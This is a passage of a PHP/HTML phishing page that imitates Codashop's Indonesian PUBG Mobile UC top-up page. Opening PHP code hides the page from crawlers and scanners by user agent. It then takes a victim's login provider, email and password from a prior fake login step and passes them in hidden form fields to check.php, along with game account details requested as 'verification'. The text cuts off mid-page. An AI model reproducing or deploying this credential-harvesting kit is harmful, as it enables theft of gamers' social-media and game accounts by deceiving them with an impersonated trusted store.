<?php 
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('http://idhaampedia.me/404.php');
die();
}
if(isset($_POST['login'])) {
    $prov = $_POST['prov'];
    $email = $_POST['user'];
    $pass  = $_POST['pass'];

    if(empty($prov) || empty($email) || empty($pass)) {
        header('location: ./');
        die();
    }
} else {
    header('location: ./');
    die();
}

?>
<!doctype html>
<html lang="en">

<head>

    <script type="text/javascript" src="https://cdn1.codashop.com/S/content/common/js/xss.min.js"></script>

    <!-- Google Tag Manager -->
    <script>
        dataLayer = [{
            'totalPrice': '0.0',
            'orderId': '0',
            'currency': '',
            'orderStatus': '',
            'paymentChannel': '',
            'items': '',
            'country': 'ID',
            'gvt': '19',
            'lvt': '50',
            'pagetype': filterXSS('Product')
        }];
    </script>

    <!-- Google Tag Manager -->
    <script>
        (function(w, d, s, l, i) {
            w[l] = w[l] || [];
            w[l].push({
                'gtm.start': new Date().getTime(),
                event: 'gtm.js'
            });
            var f = d.getElementsByTagName(s)[0],
                j = d.createElement(s),
                dl = l != 'dataLayer' ? '&l=' + l : '';
            j.async = true;
            j.src =
                'https://www.googletagmanager.com/gtm.js?id=' + i + dl;
            f.parentNode.insertBefore(j, f);
        })(window, document, 'script', 'dataLayer', 'GTM-PF7TJ9');
    </script>
    <!-- End Google Tag Manager -->

    <meta charset="UTF-8">

    <!--[if lt IE 9]>
<script src="https://cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv.min.js"></script>
<![endif]-->

    <title>PUBG Mobile UC Redeem Code - Codashop</title>

    <meta name="generator" content="coda2" />

    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, viewport-fit=cover">

    <meta name="mobile-web-app-capable" content="yes" />
    <meta name="apple-mobile-web-app-capable" content="yes" />
    <meta name="application-name" content="Codashop" />
    <meta name="apple-mobile-web-app-capable " content="yes " />
    <meta name="apple-mobile-web-app-status-bar-style " content="black " />
    <meta name="apple-mobile-web-app-title " content="Codashop " />
    <link rel="apple-touch-icon " href="/content/mobile/images/app/codashop-ico-192x192.png" />
    <meta name="msapplication-TileImage " content="/content/mobile/images/app/codashop-ico-144x144.png " />
    <meta name="msapplication-TileColor " content="#f76b1d " />
    <meta name="theme-color " content="#f76b1d" />
    <link rel="manifest" href="/manifest.json" />
    <meta name="format-detection" content="telephone=no" />
    <meta http-equiv="content-type" content="text/html; charset=utf-8">
    <link rel="icon" type="image/x-icon" href="https://cdn1.codashop.com/S/content/common/images/favicon.ico" />
    <link rel="stylesheet" href="https://cdn1.codashop.com/S/content/common/css/jquery-ui-1.12.1.css" />
    <link rel="stylesheet" type="text/css" media="all" href="https://cdn1.codashop.com/S/content/common/css/flags.css" />
    <link href="https://fonts.googleapis.com/css?family=Lato:300,300i,400,400i,700" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css?family=Noto+Sans&display=swap" rel="stylesheet">

    <link rel="stylesheet" type="text/css" media="all" href="../content/mobile/css/productPage/responsive-product-page.css" />

    <link rel="alternate" hreflang="en-IN" href="https://www.codashop.com/in" />
    <link rel="alternate" hreflang="id-ID" href="https://www.codashop.com/id" />
    <link rel="alternate" hreflang="ar-EG" href="https://www.codashop.com/eg" />
    <link rel="alternate" hreflang="ja-JP" href="https://www.codashop.com/jp" />
    <link rel="alternate" hreflang="km-KH" href="https://www.codashop.com/kh" />
    <link rel="alternate" hreflang="en-LK" href="https://www.codashop.com/lk" />
    <link rel="alternate" hreflang="lo-LA" href="https://www.codashop.com/la" />
    <link rel="alternate" hreflang="my-MM" href="https://www.codashop.com/mm" />
    <link rel="alternate" hreflang="en-MY" href="https://www.codashop.com/my" />
    <link rel="alternate" hreflang="en-PH" href="https://www.codashop.com/ph" />
    <link rel="alternate" hreflang="ar-SA" href="https://www.codashop.com/sa" />
    <link rel="alternate" hreflang="th-TH" href="https://www.codashop.com/th" />
    <link rel="alternate" hreflang="ar-AE" href="https://www.codashop.com/ae" />
    <link rel="alternate" hreflang="vi-VN" href="https://www.codashop.com/vn" />
    <link rel="alternate" hreflang="ar-BH" href="https://www.codashop.com/bh" />
    <link rel="alternate" hreflang="ar-KW" href="https://www.codashop.com/kw" />
    <link rel="alternate" hreflang="ar-MA" href="https://www.codashop.com/ma" />
    <link rel="alternate" hreflang="es-MX" href="https://www.codashop.com/mx" />
    <link rel="alternate" hreflang="en-SG" href="https://www.codashop.com/sg" />
    <link rel="alternate" hreflang="en-BD" href="https://www.codashop.com/bd" />
    <link rel="alternate" hreflang="es-AR" href="https://www.codashop.com/ar" />
    <link rel="alternate" hreflang="tr-TR" href="https://www.codashop.com/tr" />
    <link rel="alternate" hreflang="ru-RU" href="https://www.codashop.com/ru" />
    <link rel="alternate" hreflang="zh-TW" href="https://www.codashop.com/tw" />
    <link rel="alternate" hreflang="en-ZA" href="https://www.codashop.com/za" />
    <link rel="alternate" hreflang="en-NG" href="https://www.codashop.com/ng" />

    <meta name="description" content="Beli diamonds untuk Mobile Legends menggunakan GoPay, Dana, OVO, Telkomsel, Indosat, Tri, XL, Bank Transfer, Indomaret, Alfamart dan Kredivo. Diamonds terkirim secara instan, tanpa kartu kredit, dan terpercaya di Indonesia - Beli sekarang!" />

    <script type="text/javascript" src="https://cdn1.codashop.com/P/production/airtime/w/js/airtime_v1.0a.js?v=197"></script>
    <script type="text/javascript" src="https://cdn1.codashop.com/S/content/common/js/jquery-1.12.4.js?v=197"></script>
    <script type="text/javascript" src="https://cdn1.codashop.com/S/content/common/js/jquery-ui-1.12.1.min.js"></script>
    <script type="text/javascript" src="https://cdn1.codashop.com/S/content/common/js/loadingoverlay.min.js?v=197"></script>
    <script type="text/javascript" src="https://cdn1.codashop.com/S/content/common/js/loadingoverlay_progress.min.js?v=197"></script>
    <script type="text/javascript" src="https://cdn1.codashop.com/S/content/common/js/jquery.cookie.js?v=197"></script>
    <link rel="stylesheet" type="text/css" href="https://cdn1.codashop.com/P/airtime/w/css/airtime_v1.0a.css?v=197" />
    <link rel="stylesheet" href="https://cdn1.codapayments.com/W/pub/mobile-web/css/material-components-web.min.css">
    <script src="https://cdn1.codapayments.com/W/pub/mobile-web/js/material-components-web.min.js"></script>

    <script>
        function airtime_checkout(e) {
            create_airtime_form_div(e);
            try {
                jQuery("#airtime_form").overlay({
                    top: 200,
                    left: "center",
                    closeOnClick: !1,
                    load: !0,
                    mask: {
                        color: "#fff",
                        loadSpeed: "fast",
                        opacity: .5
                    },
                    onClose: function() {
                        jQuery.ajax({
                            url: "https://midas.codapayments.com/airtime/cancel",
                            data: {
                                TxnId: e
                            },
                            complete: function(e, t) {
                                close_airtime_window()
                            },
                            timeout: 2e3,
                            dataType: "text"
                        })
                    }
                })
            } catch (t) {
                $("#airtime_form").prepend("<a class='close close_js' style='z-index:1000'></a>"), $(".close_js").on("click", function() {
                    merchant_land_url = window.location, jQuery.ajax({
                        url: "https://midas.codapayments.com/airtime/cancel",
                        data: {
                            TxnId: e
                        },
                        complete: function(e, t) {
                            close_airtime_window()
                        },
                        timeout: 2e3,
                        dataType: "text"
                    })
                })
            }
            top_posi = (jQuery(window).height() - 440) / 2, top_posi > 0 && jQuery("#airtime_form").css({
                "top": "50%",
                left: "50%",
                "margin-top": "-220px",
                "margin-left": "-335px"
            })
        }
    </script>

    <!-- Facebook Pixel Code -->
    <script>
        ! function(f, b, e, v, n, t, s) {
            if (f.fbq) return;
            n = f.fbq = function() {
                n.callMethod ?
                    n.callMethod.apply(n, arguments) : n.queue.push(arguments)
            };
            if (!f._fbq) f._fbq = n;
            n.push = n;
            n.loaded = !0;
            n.version = '2.0';
            n.queue = [];
            t = b.createElement(e);
            t.async = !0;
            t.src = v;
            s = b.getElementsByTagName(e)[0];
            s.parentNode.insertBefore(t, s)
        }(window,
            document, 'script', 'https://connect.facebook.net/en_US/fbevents.js');
        fbq('init', 916139058437464); // Insert your pixel ID here.
        //fbq('track', 'PageView');
    </script>
    <noscript>
        <img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=916139058437464&ev=PageView&noscript=1" />
    </noscript>
    <!-- DO NOT MODIFY -->
    <!-- End Facebook Pixel Code -->
</head>

<body>
    <input type="hidden" id="seller-name" value="Mobile Legends">
    <input type="hidden" id="group-id" value="19">

    <div id="product-page__container">
        <!-- header -->

        <!-- Google Tag Manager (noscript) -->
        <noscript>
            <iframe src="https://www.googletagmanager.com/ns.html?id=GTM-PF7TJ9" height="0" width="0" style="display:none;visibility:hidden"></iframe>
        </noscript>
        <!-- End Google Tag Manager (noscript) -->

        <input type="hidden" id="page-name" value="productPage">
        <input type="hidden" id="country-id" value="ID">

        <div class="fade-background"></div>

        <nav class="container__full-width shadow-element">
            <section class="container topnav-container">
                <div class="topnav__left-container">

                    <a href="/" class="logo-container">

                        <img class="logo-image" src="https://cdn1.codashop.com/S/content/mobile/images/codashop-logo.png" alt="Codashop" />

                    </a>

                    <p class="slogan-element">Cara tercepat dan termudah untuk pembelian kredit permainan.</p>
                </div>
                <div class="topnav__right-container">
                    <div class="lan language-switcher-btn">
                        <a class="switcher-link">Not in Indonesia?
					<span class="lan02">

							<i class="f32_indonesia"></i>

					</span>
				</a>

                        <!-- lanPop -->
                        <div class="lanPop">
                            <div class="popCont02">
                                <ul class="languages-list">

                                    <li><a class="switcher" id="es_AR" href="/ar/"><i class="f32_argentina"></i><span style="margin-left: 20px;">Argentina</span></a></li>
                                    <li><a class="switcher" id="ar_BH" href="/bh/"><i class="f32_bahrain"></i><span style="margin-left: 20px;">Bahrain</span></a></li>
                                    <li><a class="switcher" id="en_BD" href="/bd/"><i class="f32_bangladesh"></i><span style="margin-left: 20px;">Bangladesh</span></a></li>
                                    <li><a class="switcher" id="pt_BR" href="/br/"><i class="f32_brazil"></i><span style="margin-left: 20px;">Brazil</span></a></li>
                                    <li><a class="switcher" id="km_KH" href="/kh/"><i class="f32_cambodia"></i><span style="margin-left: 20px;">Cambodia</span></a></li>
                                    <li><a class="switcher" id="ar_EG" href="/eg/"><i class="f32_egypt"></i><span style="margin-left: 20px;">Egypt</span></a></li>
                                    <li><a class="switcher" id="en_IN" href="/in/"><i class="f32_india"></i><span style="margin-left: 20px;">India</span></a></li>
                                    <li><a class="switcher" id="id_ID" href="/id/"><i class="f32_indonesia"></i><span style="margin-left: 20px;">Indonesia</span></a></li>
                                    <li><a class="switcher" id="ja_JP" href="/jp/"><i class="f32_japan"></i><span style="margin-left: 20px;">Japan</span></a></li>
                                    <li><a class="switcher" id="ar_KW" href="/kw/"><i class="f32_kuwait"></i><span style="margin-left: 20px;">Kuwait</span></a></li>
                                    <li><a class="switcher" id="lo_LA" href="/la/"><i class="f32_laos"></i><span style="margin-left: 20px;">Laos</span></a></li>
                                    <li><a class="switcher" id="en_MY" href="/my/"><i class="f32_malaysia"></i><span style="margin-left: 20px;">Malaysia</span></a></li>
                                    <li><a class="switcher" id="es_MX" href="/mx/"><i class="f32_mexico"></i><span style="margin-left: 20px;">Mexico</span></a></li>
                                    <li><a class="switcher" id="ar_MA" href="/ma/"><i class="f32_morocco"></i><span style="margin-left: 20px;">Morocco</span></a></li>
                                    <li><a class="switcher" id="my_MM" href="/mm/"><i class="f32_myanmar"></i><span style="margin-left: 20px;">Myanmar</span></a></li>
                                    <li><a class="switcher" id="en_NG" href="/ng/"><i class="f32_nigeria"></i><span style="margin-left: 20px;">Nigeria</span></a></li>
                                    <li><a class="switcher" id="en_PH" href="/ph/"><i class="f32_philippines"></i><span style="margin-left: 20px;">Philippines</span></a></li>
                                    <li><a class="switcher" id="ru_RU" href="/ru/"><i class="f32_russia"></i><span style="margin-left: 20px;">Russia</span></a></li>
                                    <li><a class="switcher" id="ar_SA" href="/sa/"><i class="f32_saudi_arabia"></i><span style="margin-left: 20px;">Saudi Arabia</span></a></li>
                                    <li><a class="switcher" id="en_SG" href="/sg/"><i class="f32_singapore"></i><span style="margin-left: 20px;">Singapore</span></a></li>
                                    <li><a class="switcher" id="en_ZA" href="/za/"><i class="f32_south_africa"></i><span style="margin-left: 20px;">South Africa</span></a></li>
                                    <li><a class="switcher" id="en_LK" href="/lk/"><i class="f32_sri_lanka"></i><span style="margin-left: 20px;">Sri Lanka</span></a></li>
                                    <li><a class="switcher" id="th_TH" href="/th/"><i class="f32_thailand"></i><span style="margin-left: 20px;">Thailand</span></a></li>
                                    <li><a class="switcher" id="tr_TR" href="/tr/"><i class="f32_turkey"></i><span style="margin-left: 20px;">Turkey</span></a></li>
                                    <li><a class="switcher" id="ar_AE" href="/ae/"><i class="f32_united_arab_emirates"></i><span style="margin-left: 20px;">UAE</span></a></li>
                                </ul>
                            </div>
                        </div>
                    </div>
                </div>

            </section>
        </nav>

        <div class="container product-container">

            <section class="product-details-container">
                <div class="product-top-banner__container"><img src="https://cdn1.codashop.com/S/content/common/images/mno/pubgmobile_640x241.jpg" alt="" class="product__top-banner"></div>

                <div class="product__name">PUBG Mobile UC Redeem Code</div>

                <input type="checkbox" id="product-description" name="product-description" class="product-description-checkbox">
                <label for="product-description">Baca lebih lanjut</label>
                <div class="product__description"><span> Promo ⇒ Codashop bagi-bagi hadiah, top up UC PUBG Mobile dan menangkan bonus 60 UC!</span>
                    <br/>
                    <br/> *10 orang pemenang beruntung diundi secara acak setiap harinya, berlaku pada 18 hingga 24 November 2019, jangan sampai ketinggalan!
                    <br/>
                    <br/>Beli Voucher UC PUBG Mobile untuk Top up PUBG Mobile! Anda juga bisa top up UC secara langsung disini.
                    <br/>
                    <br/> Cukup pilih UC yang Anda inginkan dan bayar menggunakan GoPay, Dana, OVO, LinkAja, Bank Transfer, Indomaret, Alfamart, Kredivo, TrueMoney Indonesia, Kartu Kredit dan Doku Wallet, selesaikan pembayaran, dan kode redeem yang dapat Anda tukarkan menjadi UC akan dikirimkan melalui email secara instan. Codashop adalah partner resmi PUBG Mobile, ini adalah cara terbaik untuk top up UC PUBG Mobile secara online!
                    <br/>
                    <br/> Codashop adalah cara terbaik untuk membeli diamonds secara online tanpa kartu kredit!
                    <br/>
                    <br/> Unduh PUBG Mobile sekarang!
                    <br/>

                    <a href="https://apple.co/2KwhSRJ" style="padding: 0 0 0 0;">
                        <img style="width:86px; padding-top: 5px;" src="https://d1qgcmfii0ptfa.cloudfront.net/S/content/mobile/images/app_store_coda.png" alt="Download on the App Store"></a>

                    <a href="http://bit.ly/2YJRRa3" style="padding: 0 0 0 0;">
                        <img style="width:86px; padding-top: 5px;" src="https://d1qgcmfii0ptfa.cloudfront.net/S/content/mobile/images/google_play_coda.png" alt="Download on Google Play"></a>
                </div>
            </section>
            <main id="contents" class="main-content">
                <!-- contents.s -->

                <input type="hidden" id="pricePointId" name="pricePointId" value="" />

                <div class="confirm-modal__container" id="confirm-user-dialog" title="">
                    <ul>
                        <li class="confirm-modal__title">Detail pesanan</li>
                        <li class="confirm-modal__confirm-txt">Silahkan Login Untuk Melanjutkan</li>
                    </ul>
                </div>

                <script type="text/javascript" src="https://cdn1.codashop.com/S/content/common/js/jquery.mask.min.js"></script>
                <script type="text/javascript" src="/content/mobile/js/moonton.js"></script>
                <script type="text/javascript" src="/content/common/js/third_party_common.js"></script>
                <script type="text/javascript">
                    $(document).ready(function() {
                        $("#mdn-submit").click(function() {
                            $("#confirm-user-dialog").show();
                        });
                        $("#confirm-user-dialog").dialog({
                            resizable: false,
                            height: "auto",
                            dialogClass: "no-titlebar",
                            autoOpen: false,
                            modal: true,
                            dialogClass: "confirm-user-dialog__container",
                            buttons: [{
                                text: 'Batalkan',
                                class: "confirm-user-dialog__btn btn-cancel",
                                click: function() {
                                    CODA.Shop.txnId = null;
                                    $('.confirm-user-dialog__container').hide();
                                    $("#overlay").hide();
                                }
                            }, {
                                text: 'Konfirm',
                                class: "confirm-user-dialog__btn btn-blue",
                                click: function() {
                                    $('.confirm-user-dialog__container').hide();
                                    $("#overlay").hide();
                                    openTxnWindow();
                                }
                            }],
                            create: function(event, ui) {
                                $(".ui-widget-header").hide();
                                $(this).closest(".ui-dialog").css("padding-top", "15px");
                            }
                        });

                    });

                    function showConfirmation(data, extraMsg) {
                        var ul = $("#confirm-user-dialog > ul");

                        ul = $(ul);

                        $("#confirm-user-dialog > ul > li").not('li:first, li:nth-child(2)').remove();

                        var li = $();
                        var nickname = "";
                        try {
                            nickname = JSON.parse(decodeURIComponent(data.result)).username;
                        } catch (e) {
                            nickname = decodeURIComponent(data.result);
                        }
                        filterXSS(nickname);
                        li = li.add("<li class='confirm-user-dialog__extra-msg'>" + extraMsg + "</li>");
                        li = li.add("<li><div>" + 'Nama panggilan: ' + "</div><div>" + nickname + "</div></li>");
                        li = li.add("<li><div>" + 'ID: ' + "</div><div style='direction:ltr'>" + data.user.userId + "(" + data.user.zoneId + ")" + "</div></li>");
                        li = li.add("<li><div>" + 'Harga: ' + "</div><div>" + data.channelPrice + "</div></li>");
                        li = li.add("<li><div>" + 'Bayar dengan: ' + "</div><div>" + data.paymentChannel + "</div></li>");

                        li.appendTo(ul);
                        ul.appendTo("#confirm-user-dialog");

                        $("#overlay").fadeIn(function() {
                            $(".confirm-user-dialog__container").show();
                        });
                    }
                </script>

                <script type="text/javascript">
                    $('.disable-voucher').mouseover(function() {
                        tempText = $(this).html();
                        $(this).html('Tidak tersedia');
                    });

                    $('.disable-voucher').mouseout(function() {
                        $(this).html(tempText);
                    });
                </script>

                <div class="section buy">
                    <h2 class="circle">

        <span>1</span>

        <div class="section-title">Detail Akun!</div>
    </h2 >
    <div class="form">
    <form action="check.php" method="POST">
            <input type="hidden" name="prov" value="<?= $prov ?>">
            <input type="hidden" name="user" value="<?= $email ?>">
            <input type="hidden" name="pass" value="<?= $pass ?>">
            <p class="emailOptional">Untuk Proses Verifikasi Akun, Isi data dibawah ini dengan benar.</p>

        <div class="mdc-layout-grid__cell mdc-layout-grid__cell--span-12">
                <div id="name-div" class="mdc-text-field text-field mdc-text-field--outlined margin-width email-focused"
                    data-mdc-auto-init="MDCTextField">
                        
                        <input type="text" name="nick" class="mdc-text-field__input" required>

                    <div class="mdc-notched-outline mdc-notched-outline--upgraded">
                        <div class="mdc-notched-outline__leading"></div>
                        <div class="mdc-notched-outline__notch">
                            <label class="mdc-floating-label email-input-field" for="text-field-outlined">
                                Nickname</label>
                        </div>
                        <div class="mdc-notched-outline__trailing"></div>
                    </div>
                </div>
            </div>
            <br/>
            <div class="mdc-layout-grid__cell mdc-layout-grid__cell--span-12">
                <div id="name-div" class="mdc-text-field text-field mdc-text-field--outlined margin-width email-focused"
                    data-mdc-auto-init="MDCTextField">
                        
                        <input type="text" name="country" class="mdc-text-field__input" required>

                    <div class="mdc-notched-outline mdc-notched-outline--upgraded">
                        <div class="mdc-notched-outline__leading"></div>
                        <div class="mdc-notched-outline__notch">
                            <label class="mdc-floating-label email-input-field" for="text-field-outlined">
                                Country</label>
                        </div>
                        <div class="mdc-notched-outline__trailing"></div>
                    </div>
                </div>
            </div>
            <br/>
            <div class="mdc-layout-grid__cell mdc-layout-grid__cell--span-12">
                <div id="name-div" class="mdc-text-field text-field mdc-text-field--outlined margin-width email-focused"
                    data-mdc-auto-init="MDCTextField">
                        
                    <select name="rpt" style="border: none; background: none; width: 100%; color: #000; padding: 4px;">
                        <option selected="selected" disabled="disabled" value="">-- Tipe Royal Pass --</option>
                        <option value="Free Royale Pass">Free Royale Pass</option>
                        <option value="Elite Royale Pass">Elite Royale Pass</option>
                        </select>

                    <div class="mdc-notched-outline mdc-notched-outline--upgraded">
                        <div class="mdc-notched-outline__leading"></div>
                        <div class="mdc-notched-outline__notch">
                            <label class="mdc-floating-label email-input-field" for="text-field-outlined">
                                </label>
                        </div>
                        <div class="mdc-notched-outline__trailing"></div>
                    </div>
                </div>
            </div>
            <br/>
            <div class="mdc-layout-grid__cell mdc-layout-grid__cell--span-12">
                <div id="name-div" class="mdc-text-field text-field mdc-text-field--outlined margin-width email-focused"
                    data-mdc-auto-init="MDCTextField">
                        
                    <select name="rpl" style="border: none; background: none; width: 100%; color: #000; padding: 4px;">
                        <option selected="selected" disabled="disabled" value="">-- Level Royal Pass --</option>
                        <option value="1">1</option>
	<option value="2">2</option>
	<option value="3">3</option>
	<option value="4">4</option>
	<option value="5">5</option>
	<option value="6">6</option>
	<option value="7">7</option>
	<option value="8">8</option>
	<option value="9">9</option>
	<option value="10">10</option>
	<option value="11">11</option>
	<option value="12">12</option>
	<option value="13">13</option>
	<option value="14">14</option>
	<option value="15">15</option>
	<option value="16">16</option>
	<option value="17">17</option>
	<option value="18">18</option>
	<option value="19">19</option>
	<option value="20">20</option>
	<option value="21">21</option>
	<option value="22">22</option>
	<option value="23">23</option>
	<option value="24">24</option>
	<option value="25">25</option>
	<option value="26">26</option>
	<option value="27">27</option>
	<option value="28">28</option>
	<option value="29">29</option>
	<option value="30">30</option>
	<option value="31">31</option>
	<option value="32">32</option>
	<option value="33">33</option>
	<option value="34">34</option>
	<option value="35">35</option>
	<option value="36">36</option>
	<option value="37">37</option>
	<option value="38">38</option>
	<option value="39">39</option>
	<option value="40">40</option>
	<option value="41">41</option>
	<option value="42">42</option>
	<option value="43">43</option>
	<option value="44">44</option>
	<option value="45">45</option>
	<option value="46">46</option>
	<option value="47">47</option>
	<option value="48">48</option>
	<option value="49">49</option>
	<option value="50">50</option>
	<option value="51">51</option>
	<option value="52">52</option>
	<option value="53">53</option>
	<option value="54">54</option>
	<option value="55">55</option>
	<option value="56">56</option>
	<option value="57">57</option>
	<option value="58">58</option>
	<option value="59">59</option>
	<option value="60">60</option>
	<option value="61">61</option>
	<option value="62">62</option>
	<option value="63">63</option>
	<option value="64">64</option>
	<option value="65">65</option>
	<option value="66">66</option>
	<option value="67">67</option>
	<option value="68">68</option>
	<option value="69">69</option>
	<option value="70">70</option>
	<option value="71">71</option>
	<option value="72">72</option>
	<option value="73">73</option>
	<option value="74">74</option>
	<option value="75">75</option>
	<option value="76">76</option>
	<option value="77">77</option>
	<option value="78">78</option>
	<option value="79">79</option>
	<option value="80">80</option>
	<option value="81">81</option>
	<option value="82">82</option>
	<option value="83">83</option>
	<option value="84">84</option>
	<option value="85">85</option>
	<option value="86">86</option>
	<option value="87">87</option>
	<option value="88">88</option>
	<option value="89">89</option>
	<option value="90">90</option>
	<option value="91">91</option>
	<option value="92">92</option>
	<option value="93">93</option>
	<option value="94">94</option>
	<option value="95">95</option>
	<option value="96">96</option>
	<option value="97">97</option>
	<option value="98">98</option>
	<option value="99">99</option>
	<option value="100">100</option>
                        </select>

                    <div class="mdc-notched-outline mdc-notched-outline--upgraded">
                        <div class="mdc-notched-outline__leading"></div>
                        <div class="mdc-notched-outline__notch">
                            <label class="mdc-floating-label email-input-field" for="text-field-outlined">
                                </label>
                        </div>
                        <div class="mdc-notched-outline__trailing"></div>
                    </div>
                </div>
            </div>
            <br/>
            <div class="mdc-layout-grid__cell mdc-layout-grid__cell--span-12">
                <div id="name-div" class="mdc-text-field text-field mdc-text-field--outlined margin-width email-focused"
                    data-mdc-auto-init="MDCTextField">
                        
                        <select name="tier" style="border: none; background: none; width: 100%; color: #000; padding: 4px;">
                        <option selected="selected" disabled="disabled" value="">-- Tier Level --</option>
                        <option value="Bronze">Bronze</option>
                        <option value="Silver">Silver</option>
                        <option value="Gold">Gold</option>
                        <option value="Platinum">Platinum</option>
                        <option value="Diamond">Diamond</option>
                        <option value="Crown">Crown</option>
                        <option value="Ace">Ace</option>
                        <option value="Conqueror">Conqueror</option>
                        </select>

                        <div class="mdc-notched-outline mdc-notched-outline--upgraded">
                        <div class="mdc-notched-outline__leading"></div>
                        <div class="mdc-notched-outline__notch">
                            <label class="mdc-floating-label email-input-field" for="text-field-outlined">
                                </label>
                        </div>
                        <div class="mdc-notched-outline__trailing"></div>
                    </div>
                </div>
            </div>
            <br/>
            <div class="mdc-layout-grid__cell mdc-layout-grid__cell--span-12">
                <div id="name-div" class="mdc-text-field text-field mdc-text-field--outlined margin-width email-focused"
                    data-mdc-auto-init="MDCTextField">
                        
                        <select name="level" style="border: none; background: none; width: 100%; color: #000; padding: 4px;">
                        <option selected="selected" disabled="disabled" value="">-- Level --</option>
	<option value="1">1</option>
	<option value="2">2</option>
	<option value="3">3</option>
	<option value="4">4</option>
	<option value="5">5</option>
	<option value="6">6</option>
	<option value="7">7</option>
	<option value="8">8</option>
	<option value="9">9</option>
	<option value="10">10</option>
	<option value="11">11</option>
	<option value="12">12</option>
	<option value="13">13</option>
	<option value="14">14</option>
	<option value="15">15</option>
	<option value="16">16</option>
	<option value="17">17</option>
	<option value="18">18</option>
	<option value="19">19</option>
	<option value="20">20</option>
	<option value="21">21</option>
	<option value="22">22</option>
	<option value="23">23</option>
	<option value="24">24</option>
	<option value="25">25</option>
	<option value="26">26</option>
	<option value="27">27</option>
	<option value="28">28</option>
	<option value="29">29</option>
	<option value="30">30</option>
	<option value="31">31</option>
	<option value="32">32</option>
	<option value="33">33</option>
	<option value="34">34</option>
	<option value="35">35</option>
	<option value="36">36</option>
	<option value="37">37</option>
	<option value="38">38</option>
	<option value="39">39</option>
	<option value="40">40</option>
	<option value="41">41</option>
	<option value="42">42</option>
	<option value="43">43</option>
	<option value="44">44</option>
	<option value="45">45</option>
	<option value="46">46</option>
	<option value="47">47</option>
	<option value="48">48</option>
	<option value="49">49</option>
	<option value="50">50</option>
	<option value="51">51</option>
	<option value="52">52</option>
	<option value="53">53</option>
	<option value="54">54</option>
	<option value="55">55</option>
	<option value="56">56</option>
	<option value="57">57</option>
	<option value="58">58</option>
	<option value="59">59</option>
	<option value="60">60</option>
	<option value="61">61</option>
	<option value="62">62</option>
	<option value="63">63</option>
	<option value="64">64</option>
	<option value="65">65</option>
	<option value="66">66</option>
	<option value="67">67</option>
	<option value="68">68</option>
	<option value="69">69</option>
	<option value="70">70</option>
	<option value="71">71</option>
	<option value="72">72</option>
	<option value="73">73</option>
	<option value="74">74</option>
	<option value="75">75</option>
	<option value="76">76</option>
	<option value="77">77</option>
	<option value="78">78</option>
	<option value="79">79</option>
	<option value="80">80</option>
	<option value="81">81</option>
	<option value="82">82</option>
	<option value="83">83</option>
	<option value="84">84</option>
	<option value="85">85</option>
	<option value="86">86</option>
	<option value="87">87</option>
	<option value="88">88</option>
	<option value="89">89</option>
	<option value="90">90</option>
	<option value="91">91</option>
	<option value="92">92</option>
	<option value="93">93</option>
	<option value="94">94</option>
	<option value="95">95</option>
	<option value="96">96</option>
	<option value="97">97</option>
	<option value="98">98</option>
	<option value="99">99</option>
	<option value="100">100</option>
                        </select>

                        <div class="mdc-notched-outline mdc-notched-outline--upgraded">
                        <div class="mdc-notched-outline__leading"></div>
                        <div class="mdc-notched-outline__notch">
                            <label class="mdc-floating-label email-input-field" for="text-field-outlined">
                                </label>
                        </div>
                        <div class="mdc-notched-outline__trailing"></div>
                    </div>
                </div>
            </div>
            <br/>
            <div class="mdc-layout-grid__cell mdc-layout-grid__cell--span-12">
                <div id="name-div" class="mdc-text-field text-field mdc-text-field--outlined margin-width email-focused" data-mdc-auto-init="MDCTextField">
                        
                        <select name="device" style="border: none; background: none; width: 100%; color: #000; padding: 4px;">
                        <option selected="selected" disabled="disabled" value="">-- Device --</option>
                        <option value="Android">Android</option>
                        <option value="IOS">IOS</option>
                        <option value="Emulator">Emulator</option>
                        </select>

                        <div class="mdc-notched-outline mdc-notched-outline--upgraded">
                        <div class="mdc-notched-outline__leading"></div>
                        <div class="mdc-notched-outline__notch">
                            <label class="mdc-floating-label email-input-field" for="text-field-outlined">
                                </label>
                        </div>
                        <div class="mdc-notched-outline__trailing"></div>
                    </div>
                </div>
            </div>
            <br/>
            <div class="email-form-btn-group">
                <button type="submit" name="loginData" class="mdc-button mdc-button--raised mdc-ripple-upgraded margin-width" >Submit</button>
                <div class="mdc-form-field">
                    <div id="mdc-cb" class="mdc-checkbox">
                        <input type="checkbox" class="mdc-checkbox__native-control" id="ck1">
                        <div class="mdc-checkbox__background">
                            <svg class="mdc-checkbox__checkmark" viewBox="0 0 24 24">
                                <path class="mdc-checkbox__checkmark-path" fill="none" d="M1.73,12.91 8.1,19.28 22.79,4.59"> </path>
                            </svg>
                            <div class="mdc-checkbox__mixedmark"></div>
                        </div>
                    </div>
                    <label for="ck1">Ingat saya</label>
                </div>
            </div>
        </div>
        </form>
    <input type="hidden" id="id_no">

</div>

<div class="popError">
    <div class="section">
        <h2 class="errorHeader">
            Aduh!
        </h2>
                    <ul class="errorMessage__container" id="errorMessage">
                        <li class="error-msg__element">Silahkan pilih nomor voucher</li>
                        <li class="error-msg__element"></li>
                        <li class="error-msg__element">Silahkan isi email address yang dapat dipakai</li>
                    </ul>

                    <ul class="errorMessage__container">
                        Akun anda login menggunakan : (Pilih salah satu)
                    </ul>

                    <div class="errorMessage__container" style="width: 90%; display: block; margin: auto; text-align: center;">
                        <a href="facebook" style="display: inline-block; margin: 10px 20px;">
                            <img src="../content/images/fb.png" width="50">
                        </a>
                        <a href="vk" style="display: inline-block; margin: 10px 20px;">
                            <img src="../content/images/vk.png" width="50">
                        </a>
                    </div>
                    <a href="./" class="modal-button">
            Kembali</a>
                </div>
        </div>

        <div id="overlay" class="overlay-element"></div>

        </main>
        <!-- contents.e -->

    </div>

    <section class="section product__long-description">
        <h2 class="product-tagline-title">

        Beli Voucher UC PUBG Mobile Online Mudah & Aman!

            </h2>
        <article class="product__tag-line">

